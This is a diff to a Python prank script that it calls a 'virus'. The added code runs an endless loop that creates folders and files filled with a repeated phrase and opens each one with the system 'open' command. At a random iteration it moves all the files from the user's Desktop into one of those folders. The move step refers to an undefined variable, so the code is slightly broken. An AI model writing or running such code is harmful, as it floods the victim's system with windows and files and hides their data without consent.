@@ -1,29 +1,45 @@
 
 import os
+import shutil
+import random
 
-# Define the source and destination file paths
+source_directory = os.path.expanduser("~/Desktop")
+files_to_move = os.listdir(source_directory)
+
+
 source_file = "femboy.png" 
 print("you love femboys now")
 flname = 0
-iterationtimes = 50
 folder = "virus/"
 os.system("mkdir virus")
 opens = []
+os.makedirs(folder, exist_ok=True)
+hide = random.randint(1, 300)
 while True:
     os.system(f"mkdir {folder}femboy{flname}")
+    rcurrent_folder = f"{folder}femboy{flname}"
     flnam = 0
     opens2 = []
-    for i in range(10):
-        os.system(f"touch {folder}femboy{flname}/{flnam}{source_file}")
-        os.system(f"touch {folder}femboy{flname}/{flnam}femboy.txt")
-        b = open(f"{folder}femboy{flname}/{flnam}femboy.txt", "w")
-        b.write("i love femboys")
-        b.close
+    if flname == hide:
+        for filename in files_to_move:
+            source_path = os.path.join(source_directory, filename)
+            destination_path = os.path.join(current_folder, filename)
+            if os.path.isfile(source_path):
+                shutil.move(source_path, destination_path)
+    os.system(f"touch {folder}femboy{flname}/{flnam}{source_file}")
+    os.system(f"touch {folder}femboy{flname}/{flnam}femboy.txt")
+    b = open(f"{folder}femboy{flname}/{flnam}femboy.txt", "w")
+    b.write("i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys i love femboys ")
+    b.close
+    opens2.append(f"{folder}femboy{flname}/{flnam}femboy.txt")
+    for d in opens2:
+        os.system(f"open {d}")
         
-        flnam += 1
-    flname += 1
+    print(d)
+    flnam += 1
     opens.append(f"{folder}femboy{flname}")
     for i in opens:
         os.system(f"open {i}")
         pass
 
+    flname += 1
